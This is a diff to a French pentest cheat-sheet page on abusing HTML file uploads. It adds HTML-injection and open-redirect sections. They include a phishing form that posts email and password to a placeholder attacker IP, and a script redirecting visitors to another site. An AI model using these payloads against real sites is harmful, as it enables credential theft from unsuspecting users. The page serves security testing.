@@ -2,7 +2,7 @@
 
 ![](logo_html5.png)
 
-**Facteur de risque** : XSS
+**Facteur de risque** : XSS, HTML Injection
 
 **Extension** : `.html`, `.htm`
 
@@ -39,10 +39,70 @@ Le code HTML suivant fait apparaître un pop up :
 </html>
 ```
 
+## HTML Injection
+
+### Pré-requis
+
+- Le fichier doit être accessible après avoir été uploadé
+
+### Attaque
+
+Dans certaines contextes, le payload XSS peut être refusé. Mais l'injection de code HTML est toujours possible.
+Pourvoir exécuter de l'HTML permet à un attaqueur d'effectuer du **phishing**, contourner le CSP (**CSP bypass**) etc.
+
+Un exemple pour le phishing :
+
+**html\_phishing.html**, **html\_phishing.htm**
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+    <style>
+        h1 {color: green}
+    </style>
+    <h1>HTML Injection : Phishing</h1>
+    <b>Entrez vos identifiants :</b>
+    <form action="http://xxx.xxx.xxx.xxx:1234" method="GET">
+         <input type="text" name="email" placeholder="Email"/>
+        <input type="password" name="password" placeholder="Mot de passe"/>
+        <input type="submit" value="Submit"/>
+    </form>
+</body>
+</html>
+```
+
+## Open Redirect
+
+### Pré-requis
+
+- Le fichier doit être accessible après avoir été uploadé
+
+### Attaque
+
+Le code suivant permet une redirection sur google.com :
+
+**openredirect.html**, **openredirect.htm**
+
+```html
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    window.location = "https://www.google.com/";
+</script>
+</body>
+</html>
+```
+
 ## References
 
 [PayloadsAllTheThings/xss.htm at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/xss.htm)
 
 [PayloadsAllTheThings/xss.html at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20HTML/xss.html)
 
+[What Are HTML Injections | Acunetix](https://www.acunetix.com/blog/web-security-zone/html-injections/)
+
 ## Todo
+
+Crée des fichiers JavaScript ?
